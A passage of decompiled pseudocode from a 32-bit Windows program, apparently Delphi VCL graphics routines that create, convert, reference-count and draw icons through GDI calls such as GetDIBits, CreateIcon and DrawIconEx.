    &loc_414CDF,
    &savedregs);
  if ( *(_QWORD *)a5 )
  {
    *a4 = *a5;
    a4[1] = a5[1];
  }
  else
  {
    *a4 = GetSystemMetrics(11);
    a4[1] = GetSystemMetrics(12);
  }
  hdc = GetDC(0);
  if ( !hdc )
    sub_4143D8();
  v21 = &savedregs;
  v20 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_414AD1;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  DeviceCaps = GetDeviceCaps(hdc, 14);
  v7 = GetDeviceCaps(hdc, 12) * DeviceCaps;
  if ( v7 <= 8u )
    v40 = 1 << v7;
  else
    v40 = 0x7FFFFFFF;
  __writefsdword(0, (unsigned int)ExceptionList);
  v21 = (int *)&loc_414AD8;
  ReleaseDC(0, hdc);
  v38 = 0;
  v39 = sub_41494C(*((unsigned __int16 *)v43 + 1));
  v8 = v44 - 1;
  if ( v44 - 1 > 0 )
  {
    v9 = 1;
    do
    {
      v10 = sub_41494C(*(unsigned __int16 *)&v43[16 * v9 + 2]);
      v11 = v10;
      if ( v10 <= v40
        && v10 >= v39
        && sub_414958((unsigned __int8 *)&v43[16 * v38], (unsigned __int8 *)&v43[16 * v9], (int)&savedregs) )
      {
        v38 = v9;
        v39 = v11;
      }
      ++v9;
      --v8;
    }
    while ( v8 );
  }
  v32 = &v43[16 * v38];
  *a4 = (unsigned __int8)*v32;
  a4[1] = (unsigned __int8)v32[1];
  v36 = sub_406D34(*((_DWORD *)v32 + 2));
  v21 = &savedregs;
  v20 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_414CBF;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  LOWORD(v12) = 1;
  (*(void (__fastcall **)(int, int, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, int *))(*(_DWORD *)v46 + 12))(
    v12,
    *((_DWORD *)v32 + 3) - (a6 + v42),
    ExceptionList,
    &loc_414CBF,
    &savedregs,
    v22);
  v13 = (BITMAPINFOHEADER *)v36;
  (*(void (__fastcall **)(_DWORD, char *))(*(_DWORD *)v46 + 4))(*((_DWORD *)v32 + 2), v36);
  sub_414790(v13, (HGDIOBJ *)&h.Handler, &h, a4);
  GetObjectA(h.Next, 24, pv);
  GetObjectA(h.Handler, 24, v27);
  v14 = v26 * v24 * v25;
  cb = v30 * v28 * v29;
  v41 = v14 + cb;
  lpvBits = sub_406D34(v14 + cb);
  v22 = &savedregs;
  v21 = (int *)&loc_414C9C;
  v20 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v20);
  v15 = (const BYTE *)lpvBits;
  v16 = (char *)lpvBits + v14;
  GetBitmapBits((HBITMAP)h.Next, v14, lpvBits);
  GetBitmapBits((HBITMAP)h.Handler, cb, v16);
  DeleteObject(h.Handler);
  DeleteObject(h.Next);
  Icon = CreateIcon(hInst, *a4, a4[1], v30, v31, v15, (const BYTE *)v16);
  *v45 = Icon;
  if ( !*v45 )
    sub_41442C();
  __writefsdword(0, (unsigned int)v20);
  v22 = (int *)&loc_414CA3;
  sub_4025B0((int)lpvBits);
  __writefsdword(0, (unsigned int)v20);
  v22 = (int *)&loc_414CC6;
  sub_4025B0((int)v36);
  __writefsdword(0, (unsigned int)v20);
  v22 = (int *)&loc_414CE6;
  return sub_4025B0((int)v43);
}
// 414B99: variable 'v12' is possibly undefined
// 4149E8: using guessed type char pv[8];
// 4149E8: using guessed type char var_58[8];

//----- (00414CF0) --------------------------------------------------------
unsigned int __usercall sub_414CF0@<eax>(void *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int ObjectA; // eax
  unsigned int result; // eax
  int v7; // ecx
  _DWORD v8[4]; // [esp+0h] [ebp-60h] BYREF
  __int16 v9; // [esp+10h] [ebp-50h]
  __int16 v10; // [esp+12h] [ebp-4Eh]
  int v11[10]; // [esp+18h] [ebp-48h] BYREF

  v11[0] = 0;
  ObjectA = GetObjectA(a1, 84, v8);
  if ( ObjectA )
  {
    if ( ObjectA < 64 || v11[0] < 0x28u )
    {
      sub_4028D4((char *)a2, 40, 0);
      *(_DWORD *)a2 = 40;
      *(_DWORD *)(a2 + 4) = v8[1];
      *(_DWORD *)(a2 + 8) = v8[2];
    }
    else
    {
      qmemcpy((void *)a2, v11, 0x28u);
    }
  }
  else
  {
    sub_4143C0();
  }
  if ( a3 == 2 )
  {
    *(_WORD *)(a2 + 14) = 1;
  }
  else if ( (unsigned int)(a3 - 3) < 0xE )
  {
    *(_WORD *)(a2 + 14) = 4;
    *(_DWORD *)(a2 + 32) = a3;
  }
  else if ( (unsigned int)(a3 - 17) < 0xF0 )
  {
    *(_WORD *)(a2 + 14) = 8;
    *(_DWORD *)(a2 + 32) = a3;
  }
  else
  {
    *(_WORD *)(a2 + 14) = v9 * v10;
  }
  *(_WORD *)(a2 + 12) = 1;
  result = *(_DWORD *)(a2 + 32);
  if ( result < *(_DWORD *)(a2 + 36) )
    *(_DWORD *)(a2 + 36) = result;
  if ( !*(_DWORD *)(a2 + 20) )
  {
    v7 = sub_414664(*(_DWORD *)(a2 + 4), *(unsigned __int16 *)(a2 + 14), 32);
    result = abs32(*(_DWORD *)(a2 + 8));
    *(_DWORD *)(a2 + 20) = result * v7;
  }
  return result;
}

//----- (00414DD4) --------------------------------------------------------
int __userpurge sub_414DD4@<eax>(void *a1@<eax>, int *a2@<edx>, _DWORD *a3@<ecx>, int a4)
{
  int v6; // eax
  int result; // eax
  char v8[14]; // [esp+8h] [ebp-28h] BYREF
  unsigned __int16 v9; // [esp+16h] [ebp-1Ah]
  char v10; // [esp+18h] [ebp-18h]
  int v11; // [esp+1Ch] [ebp-14h]
  int v12; // [esp+28h] [ebp-8h]

  sub_414CF0(a1, (int)v8, a4);
  if ( v9 <= 8u )
  {
    if ( v12 )
      v6 = 4 * v12 + 40;
    else
      v6 = 4 * (1 << v9) + 40;
    *a2 = v6;
  }
  else
  {
    *a2 = 40;
    if ( (v10 & 3) != 0 )
      *a2 += 12;
  }
  result = v11;
  *a3 = v11;
  return result;
}
// 414DD4: using guessed type char var_28[14];

//----- (00414E38) --------------------------------------------------------
bool __userpurge sub_414E38@<al>(
        LPBITMAPINFO lpbmi@<ecx>,
        HPALETTE hPal@<edx>,
        HBITMAP a3@<eax>,
        int a4,
        LPVOID lpvBits)
{
  unsigned int v9[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v10; // [esp-4h] [ebp-1Ch]
  HDC hdc; // [esp+Ch] [ebp-Ch]
  HPALETTE hPala; // [esp+10h] [ebp-8h]
  bool v13; // [esp+17h] [ebp-1h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  sub_414CF0(a3, (int)lpbmi, a4);
  hPala = 0;
  hdc = CreateCompatibleDC(0);
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_414ED5;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  if ( hPal )
  {
    hPala = SelectPalette(hdc, hPal, 0);
    RealizePalette(hdc);
  }
  v13 = GetDIBits(hdc, a3, 0, lpbmi->bmiHeader.biHeight, lpvBits, lpbmi, 0) != 0;
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_414EDC;
  if ( hPala )
    SelectPalette(hdc, hPala, 0);
  DeleteDC(hdc);
  return v13;
}

//----- (00414EEC) --------------------------------------------------------
int __usercall sub_414EEC@<eax>(int result@<eax>)
{
  if ( !result )
    return nullsub_1();
  return result;
}
// 414EE8: using guessed type int nullsub_1(void);

//----- (00414EF8) --------------------------------------------------------
BOOL __usercall sub_414EF8@<eax>(int a1@<eax>, HICON a2@<edx>, char a3@<cl>)
{
  int IconInfo; // eax
  LPBITMAPINFO v6; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *v8; // [esp-18h] [ebp-78h] BYREF
  void *v9; // [esp-14h] [ebp-74h]
  int *v10; // [esp-10h] [ebp-70h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-6Ch] BYREF
  void *v12; // [esp-8h] [ebp-68h]
  int *v13; // [esp-4h] [ebp-64h]
  void *v14; // [esp+0h] [ebp-60h]
  char v15[2]; // [esp+Ch] [ebp-54h] BYREF
  __int16 v16; // [esp+Eh] [ebp-52h]
  int v17; // [esp+14h] [ebp-4Ch]
  int v18; // [esp+18h] [ebp-48h]
  ICONINFO piconinfo; // [esp+1Ch] [ebp-44h] BYREF
  int v20; // [esp+30h] [ebp-30h] BYREF
  char v21[2]; // [esp+36h] [ebp-2Ah] BYREF
  __int16 v22; // [esp+38h] [ebp-28h]
  __int16 v23; // [esp+3Ah] [ebp-26h]
  LPVOID v24; // [esp+3Ch] [ebp-24h]
  LPBITMAPINFO v25; // [esp+40h] [ebp-20h]
  LPVOID lpvBits; // [esp+44h] [ebp-1Ch]
  LPBITMAPINFO lpbmi; // [esp+48h] [ebp-18h]
  int v28; // [esp+4Ch] [ebp-14h] BYREF
  int v29; // [esp+50h] [ebp-10h] BYREF
  int v30; // [esp+54h] [ebp-Ch] BYREF
  int v31; // [esp+58h] [ebp-8h] BYREF
  char v32; // [esp+5Fh] [ebp-1h]
  int savedregs; // [esp+60h] [ebp+0h] BYREF

  v32 = a3;
  sub_4028D4(v21, 6, 0);
  sub_4028D4(v15, 16, 0);
  IconInfo = GetIconInfo(a2, &piconinfo);
  sub_414EEC(IconInfo);
  v13 = &savedregs;
  v12 = &loc_4150E6;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_414DD4(piconinfo.hbmMask, &v31, &v29, 2);
  sub_414DD4(piconinfo.hbmColor, &v30, &v28, 16);
  lpbmi = 0;
  lpvBits = 0;
  v25 = 0;
  v24 = 0;
  v10 = &savedregs;
  v9 = &loc_4150BF;
  v8 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v8);
  lpbmi = (LPBITMAPINFO)sub_406D34(v31);
  lpvBits = sub_406D34(v29);
  v25 = (LPBITMAPINFO)sub_406D34(v30);
  v24 = sub_406D34(v28);
  sub_414E38(lpbmi, 0, piconinfo.hbmMask, 2, lpvBits);
  sub_414E38(v25, 0, piconinfo.hbmColor, 16, v24);
  if ( v32 )
  {
    v20 = v29 + v28 + v30 + 22;
    (*(void (__fastcall **)(int, int *))(*(_DWORD *)a1 + 8))(4, &v20);
  }
  v22 = 1;
  v23 = 1;
  (*(void (__fastcall **)(int, char *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 8))(
    6,
    v21,
    v8,
    v9,
    v10,
    ExceptionList);
  v6 = v25;
  v15[0] = v25->bmiHeader.biWidth;
  v15[1] = v25->bmiHeader.biHeight;
  v16 = v25->bmiHeader.biBitCount * v25->bmiHeader.biPlanes;
  v17 = v29 + v28 + v30;
  v18 = 22;
  (*(void (__fastcall **)(int, char *))(*(_DWORD *)a1 + 8))(16, v15);
  v6->bmiHeader.biHeight *= 2;
  (*(void (__fastcall **)(int, LPBITMAPINFO))(*(_DWORD *)a1 + 8))(v30, v25);
  (*(void (__fastcall **)(int, LPVOID))(*(_DWORD *)a1 + 8))(v28, v24);
  (*(void (__fastcall **)(int, LPVOID))(*(_DWORD *)a1 + 8))(v29, lpvBits);
  __writefsdword(0, (unsigned int)v12);
  v14 = &loc_4150C6;
  sub_4025B0((int)v25);
  sub_4025B0((int)v24);
  sub_4025B0((int)lpbmi);
  sub_4025B0((int)lpvBits);
  __writefsdword(0, (unsigned int)v12);
  v14 = &loc_4150ED;
  DeleteObject(piconinfo.hbmColor);
  return DeleteObject(piconinfo.hbmMask);
}
// 414EF8: using guessed type int var_8;
// 414EF8: using guessed type int var_30;

//----- (004150F4) --------------------------------------------------------
_DWORD *__usercall sub_4150F4@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // esi

  if ( a2 )
    a1 = (_DWORD *)sub_402CDC((int)a1, a2);
  v2 = a2;
  v3 = a1;
  sub_402BAC(a1, 0);
  if ( v2 )
    sub_402D34(v3);
  return v3;
}
// 415102: variable 'a2' is possibly undefined

//----- (0041512C) --------------------------------------------------------
int __usercall sub_41512C@<eax>(int result@<eax>, int a2@<ecx>)
{
  *(_BYTE *)(result + 24) = 1;
  if ( *(_WORD *)(result + 10) )
    return (*(int (__fastcall **)(int, int))(result + 8))(a2, result);
  return result;
}

//----- (00415144) --------------------------------------------------------
char __cdecl sub_415144(int a1)
{
  if ( !*(_DWORD *)(*(_DWORD *)(a1 - 4) + 32) )
    return (*(int (**)(void))(**(_DWORD **)(a1 - 8) + 28))() ^ 1;
  return !sub_402C40(*(int **)(*(_DWORD *)(a1 - 4) + 32), (int)&off_4134E4)
      || !(*(unsigned __int8 (**)(void))(**(_DWORD **)(a1 - 8) + 24))();
}
// 4134E4: using guessed type void *off_4134E4;

//----- (0041519C) --------------------------------------------------------
int __usercall sub_41519C@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // eax
  int v4; // [esp-10h] [ebp-1Ch]
  int v6; // [esp-8h] [ebp-14h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v6 = *(_DWORD *)(*(_DWORD *)a1 + 48);
  v4 = *(_DWORD *)(*(_DWORD *)a1 + 68);
  LOBYTE(v2) = sub_415144((int)&savedregs);
  return (*(int (__fastcall **)(int, const char *, int, int, int, int))(*(_DWORD *)a2 + 8))(v2, "Data", v4, a1, v6, a1);
}
// 4151D0: variable 'v2' is possibly undefined

//----- (004151E8) --------------------------------------------------------
bool __usercall sub_4151E8@<al>(int a1@<eax>, int a2@<edx>)
{
  int v4; // edi
  bool v5; // al
  int v7; // ebx
  int v8; // eax
  bool v9; // al
  _DWORD v11[2]; // [esp-14h] [ebp-2Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v13; // [esp-8h] [ebp-20h]
  int *v14; // [esp-4h] [ebp-1Ch]
  void *v15; // [esp+0h] [ebp-18h]
  _DWORD *v16; // [esp+Ch] [ebp-Ch]
  _DWORD *v17; // [esp+10h] [ebp-8h]
  bool v18; // [esp+17h] [ebp-1h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v5 = 0;
  if ( a2 )
  {
    v4 = sub_402B58(a1);
    if ( v4 == sub_402B58(a2) )
      v5 = 1;
  }
  v18 = v5;
  if ( (*(unsigned __int8 (**)(void))(*(_DWORD *)a1 + 28))() || (*(unsigned __int8 (**)(void))(*(_DWORD *)a2 + 28))() )
  {
    return (*(unsigned __int8 (**)(void))(*(_DWORD *)a1 + 28))()
        && (*(unsigned __int8 (**)(void))(*(_DWORD *)a2 + 28))();
  }
  else if ( v18 )
  {
    v17 = sub_402BAC(off_40BE60, 1);
    v14 = &savedregs;
    v13 = &loc_415319;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 68))(ExceptionList);
    v16 = sub_402BAC(off_40BE60, 1);
    ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
    v11[1] = &loc_4152FC;
    v11[0] = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v11);
    (*(void (__stdcall **)(_DWORD, void *, int *))(*(_DWORD *)a2 + 68))(v11[0], &loc_4152FC, &savedregs);
    v7 = sub_40D84C((int)v17);
    v9 = 0;
    if ( v7 == sub_40D84C((int)v16) )
    {
      v8 = sub_40D84C((int)v17);
      if ( (unsigned __int8)sub_406DCC((_DWORD *)v17[1], (_DWORD *)v16[1], v8) )
        v9 = 1;
    }
    v18 = v9;
    __writefsdword(0, (unsigned int)v13);
    v15 = &loc_415303;
    sub_402BDC(v16);
    __writefsdword(0, (unsigned int)v13);
    v15 = &loc_415320;
    sub_402BDC(v17);
  }
  return v18;
}
// 40BE60: using guessed type int (*off_40BE60[5])();

//----- (0041532C) --------------------------------------------------------
int sub_41532C()
{
  return 0;
}

//----- (00415330) --------------------------------------------------------
char __usercall sub_415330@<al>(int a1@<eax>)
{
  return *(_BYTE *)(a1 + 25);
}

//----- (00415334) --------------------------------------------------------
_DWORD *__usercall sub_415334@<eax>(int a1@<eax>, char *a2@<edx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-14h] BYREF
  void *v5; // [esp-8h] [ebp-10h]
  int *v6; // [esp-4h] [ebp-Ch]
  void *v7; // [esp+0h] [ebp-8h]
  _DWORD *v8; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v8 = sub_40D940(off_40BD88, 1, a2, 32);
  v6 = &savedregs;
  v5 = &loc_41537C;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 80))(ExceptionList);
  __writefsdword(0, (unsigned int)v5);
  v7 = &loc_415383;
  return sub_402BDC(v8);
}
// 40BD88: using guessed type int (*off_40BD88[4])();

//----- (00415388) --------------------------------------------------------
int __userpurge sub_415388@<eax>(int result@<eax>, int a2@<ebx>, int a3, int a4, char a5, char a6)
{
  int v6; // [esp-4h] [ebp-8h]

  if ( *(_WORD *)(result + 18) )
  {
    LOBYTE(a2) = a6;
    v6 = a2;
    LOBYTE(a2) = a5;
    return (*(int (__stdcall **)(int, int, int, int))(result + 16))(a3, a4, a2, v6);
  }
  return result;
}

//----- (004153B0) --------------------------------------------------------
int __usercall sub_4153B0@<eax>(int a1@<eax>)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 80))();
}

//----- (004153BC) --------------------------------------------------------
_DWORD *__usercall sub_4153BC@<eax>(int a1@<eax>, char *a2@<edx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-14h] BYREF
  void *v5; // [esp-8h] [ebp-10h]
  int *v6; // [esp-4h] [ebp-Ch]
  void *v7; // [esp+0h] [ebp-8h]
  _DWORD *v8; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v8 = sub_40D940(off_40BD88, 1, a2, 0xFFFF);
  v6 = &savedregs;
  v5 = &loc_415407;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 84))(ExceptionList);
  __writefsdword(0, (unsigned int)v5);
  v7 = &loc_41540E;
  return sub_402BDC(v8);
}
// 40BD88: using guessed type int (*off_40BD88[4])();

//----- (00415418) --------------------------------------------------------
_BYTE *__usercall sub_415418@<eax>(_BYTE *result@<eax>, char a2@<dl>)
{
  if ( a2 != result[25] )
  {
    result[25] = a2;
    return (_BYTE *)(*(int (**)(void))(*(_DWORD *)result + 16))();
  }
  return result;
}

//----- (00415428) --------------------------------------------------------
int __usercall sub_415428@<eax>(int a1@<eax>)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 84))();
}

//----- (00415434) --------------------------------------------------------
void sub_415434()
{
  unsigned int v0[2]; // [esp-18h] [ebp-24h] BYREF
  int *v1; // [esp-10h] [ebp-1Ch]
  unsigned int v2[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v3; // [esp-4h] [ebp-10h]
  int v4; // [esp+0h] [ebp-Ch]
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v5 = sub_40C4B0(dword_41DA70);
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_4154D2;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( *(_DWORD *)(v5 + 8) - 1 >= 0 )
  {
    v6 = *(_DWORD *)(v5 + 8) - 1;
    do
    {
      v4 = sub_40C20C(v5, v6);
      if ( sub_4140CC(v4) )
      {
        v1 = &savedregs;
        v0[1] = (unsigned int)&loc_4154AA;
        v0[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)v0);
        sub_4154E0(v4);
        __writefsdword(0, v0[0]);
        v1 = (int *)&loc_4154B1;
        sub_414128(v4);
      }
      --v6;
    }
    while ( v6 != -1 );
  }
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_4154D9;
  sub_40C514(dword_41DA70);
}
// 41DA70: using guessed type int dword_41DA70;

//----- (004154E0) --------------------------------------------------------
void __usercall sub_4154E0(int a1@<eax>)
{
  HPALETTE v1; // eax
  HDC v2; // ebx
  unsigned int v3[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v4; // [esp-4h] [ebp-Ch]
  int v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = a1;
  if ( *(_DWORD *)(a1 + 4) )
  {
    sub_414078(v5);
    v4 = &savedregs;
    v3[1] = (unsigned int)&loc_415574;
    v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v3);
    if ( *(_DWORD *)(v5 + 92) )
      SelectObject(*(HDC *)(v5 + 4), *(HGDIOBJ *)(v5 + 92));
    v1 = *(HPALETTE *)(v5 + 96);
    if ( v1 )
      SelectPalette(*(HDC *)(v5 + 4), v1, -1);
    v2 = *(HDC *)(v5 + 4);
    sub_4141F0(v5, 0);
    DeleteDC(v2);
    sub_40C4C4(dword_41DA70, v5);
    __writefsdword(0, v3[0]);
    v4 = (int *)&loc_41557B;
    sub_414128(v5);
  }
}
// 41DA70: using guessed type int dword_41DA70;

//----- (00415580) --------------------------------------------------------
int __usercall sub_415580@<eax>(int result@<eax>)
{
  ++*(_DWORD *)(result + 4);
  return result;
}

//----- (00415584) --------------------------------------------------------
_DWORD *__usercall sub_415584@<eax>(_DWORD *result@<eax>)
{
  _DWORD *v1; // ebx

  v1 = result;
  if ( result )
  {
    if ( !--result[1] )
    {
      (*(void (**)(void))*result)();
      return sub_402BDC(v1);
    }
  }
  return result;
}

//----- (004155A4) --------------------------------------------------------
_DWORD *__usercall sub_4155A4@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_402BDC((_DWORD *)v2[3]);
  result = sub_402BCC(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_402D2C(v5);
  return result;
}
// 4155AB: variable 'v3' is possibly undefined

//----- (004155D4) --------------------------------------------------------
int __usercall sub_4155D4@<eax>(int a1@<eax>)
{
  HICON v2; // eax
  int result; // eax

  v2 = *(HICON *)(a1 + 8);
  if ( v2 )
    DestroyIcon(v2);
  result = 0;
  *(_DWORD *)(a1 + 8) = 0;
  return result;
}

//----- (004155EC) --------------------------------------------------------
_DWORD *__usercall sub_4155EC@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // edi
  _DWORD *v4; // eax

  if ( a2 )
    a1 = (_DWORD *)sub_402CDC((int)a1, a2);
  v2 = a2;
  v3 = a1;
  sub_4150F4(a1, 0);
  *((_BYTE *)v3 + 25) = 1;
  v4 = sub_402BAC(&off_413628, 1);
  v3[8] = v4;
  sub_415580((int)v4);
  if ( v2 )
    sub_402D34(v3);
  return v3;
}
// 4155FB: variable 'a2' is possibly undefined
// 413628: using guessed type int (*off_413628)();

//----- (00415640) --------------------------------------------------------
_DWORD *__usercall sub_415640@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_415584((_DWORD *)v2[8]);
  result = sub_40C520(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_402D2C(v5);
  return result;
}
// 415647: variable 'v3' is possibly undefined

//----- (00415670) --------------------------------------------------------
_DWORD *__usercall sub_415670@<eax>(int a1@<eax>, int a2@<edx>)
{
  if ( a2 && !sub_402C40((int *)a2, (int)&off_413684) )
    return sub_40C54C((int *)a1, (int (***)(void))a2);
  if ( a2 )
  {
    sub_415580(*(_DWORD *)(a2 + 32));
    sub_415584(*(_DWORD **)(a1 + 32));
    *(_DWORD *)(a1 + 32) = *(_DWORD *)(a2 + 32);
  }
  else
  {
    sub_415948(a1, 0, 0);
  }
  return (_DWORD *)(*(int (**)(void))(*(_DWORD *)a1 + 16))();
}
// 413684: using guessed type void *off_413684;

//----- (004156D0) --------------------------------------------------------
BOOL __usercall sub_4156D0@<eax>(HICON a1@<eax>, int a2@<edx>, int *a3@<ecx>)
{
  HICON v6; // eax

  sub_414244(a2, 1, (DWORD)a3);
  v6 = (HICON)sub_415728(a1);
  return DrawIconEx(*(HDC *)(a2 + 4), *a3, a3[1], v6, 0, 0, 0, 0, 3u);
}

//----- (00415710) --------------------------------------------------------
bool __usercall sub_415710@<al>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 32);
  return !*(_DWORD *)(v1 + 8) && !*(_DWORD *)(v1 + 12);
}

//----- (00415728) --------------------------------------------------------
int __usercall sub_415728@<eax>(HICON a1@<eax>)
{
  sub_415764(a1);
  return *(_DWORD *)(*((_DWORD *)a1 + 8) + 8);
}

//----- (0041573C) --------------------------------------------------------
int __usercall sub_41573C@<eax>(int a1@<eax>)
{
  int result; // eax

  result = *(_DWORD *)(*(_DWORD *)(a1 + 32) + 20);
  if ( !result )
    return GetSystemMetrics(12);
  return result;
}

//----- (00415750) --------------------------------------------------------
int __usercall sub_415750@<eax>(int a1@<eax>)
{
  int result; // eax

  result = *(_DWORD *)(*(_DWORD *)(a1 + 32) + 16);
  if ( !result )
    return GetSystemMetrics(11);
  return result;
}

//----- (00415764) --------------------------------------------------------
HICON __usercall sub_415764@<eax>(HICON result@<eax>)
{
  HICON v1; // esi
  int v2; // ebx
  int v3; // [esp+0h] [ebp-14h] BYREF
  unsigned __int16 v4; // [esp+4h] [ebp-10h]
  HICON v5; // [esp+8h] [ebp-Ch] BYREF

  v1 = result;
  v2 = *((_DWORD *)result + 8);
  if ( !*(_DWORD *)(v2 + 8) )
  {
    result = *(HICON *)(v2 + 12);
    if ( result )
    {
      sub_40D840((int)result);
      sub_40D884(*(_DWORD *)(v2 + 12), (int)&v3, 6);
      if ( HIWORD(v3) )
      {
        if ( HIWORD(v3) == 1 )
          sub_4149E8(*(_DWORD *)(v2 + 12), &v5, v4, (int *)(v2 + 16), (int *)v1 + 9, 6);
        else
          sub_4143CC();
      }
      else
      {
        v5 = (HICON)dword_41E68C;
      }
      result = v5;
      *(_DWORD *)(v2 + 8) = v5;
    }
  }
  return result;
}
// 41E68C: using guessed type int dword_41E68C;

//----- (004157DC) --------------------------------------------------------
_DWORD *__usercall sub_4157DC@<eax>(_DWORD *result@<eax>)
{
  HICON v1; // esi
  int v2; // ebx
  HICON v3; // eax
  unsigned int v4[6]; // [esp-Ch] [ebp-24h] BYREF
  char v5[6]; // [esp+Eh] [ebp-Ah] BYREF
  _DWORD *v6; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v1 = (HICON)result;
  v2 = result[8];
  if ( !*(_DWORD *)(v2 + 12) )
  {
    if ( !*(_DWORD *)(v2 + 8) )
      sub_4143CC();
    v6 = sub_402BAC(off_40BE60, 1);
    v4[2] = (unsigned int)&savedregs;
    v4[1] = (unsigned int)&loc_415869;
    v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    if ( sub_415728(v1) == dword_41E68C )
    {
      sub_4028D4(v5, 6, 0);
      sub_40D8BC((int)v6, (int)v5, 6);
    }
    else
    {
      v3 = (HICON)sub_415728(v1);
      sub_414EF8((int)v6, v3, 0);
    }
    __writefsdword(0, v4[0]);
    result = v6;
    *(_DWORD *)(v2 + 12) = v6;
  }
  return result;
}
// 40BE60: using guessed type int (*off_40BE60[5])();
// 41E68C: using guessed type int dword_41E68C;

//----- (00415890) --------------------------------------------------------
int __usercall sub_415890@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v4; // eax
  unsigned int v6[6]; // [esp-Ch] [ebp-24h] BYREF
  char v7[2]; // [esp+Eh] [ebp-Ah] BYREF
  unsigned __int16 v8; // [esp+10h] [ebp-8h]
  void (***v9)(void); // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v9 = (void (***)(void))sub_402BAC(off_40BE60, 1);
  v6[2] = (unsigned int)&savedregs;
  v6[1] = (unsigned int)&loc_41591F;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_40D84C(a2);
  sub_40D830(a2);
  (**v9)();
  v4 = sub_40D84C((int)v9);
  sub_40D884(a2, (int)v9[1], v4);
  sub_40D884((int)v9, (int)v7, 6);
  if ( v8 >= 2u )
    sub_4143CC();
  sub_415948(a1, 0, (int)v9);
  __writefsdword(0, v6[0]);
  return (*(int (**)(void))(*(_DWORD *)a1 + 16))();
}
